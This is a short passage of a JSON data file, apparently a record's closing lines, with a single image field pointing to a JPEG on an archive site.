        "img": "https://archive.orkl.eu/77ffc390c576b4b5d65155d9f53d20cd9315e53d.jpg"
    }
}